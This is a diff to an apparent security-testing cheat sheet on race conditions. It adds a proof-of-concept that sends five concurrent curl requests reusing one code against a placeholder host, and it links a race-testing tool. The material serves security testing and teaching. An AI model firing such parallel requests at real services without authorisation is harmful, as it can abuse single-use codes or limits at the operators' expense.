@@ -1,5 +1,16 @@
 # Race Condition
 
+## Base PoC
+
+```
+curl -X GET 'https://example.com/?code=123&user=1' & \
+curl -X GET 'https://example.com/?code=123&user=2' & \
+curl -X GET 'https://example.com/?code=123&user=3' & \
+curl -X GET 'https://example.com/?code=123&user=4' & \
+curl -X GET 'https://example.com/?code=123&user=5' & \
+wait
+```
+
 ## Some tools
 
 Race-the-Web (Go):[ https://github.com/aaronhnatiw/race-the-web](https://github.com/aaronhnatiw/race-the-web)
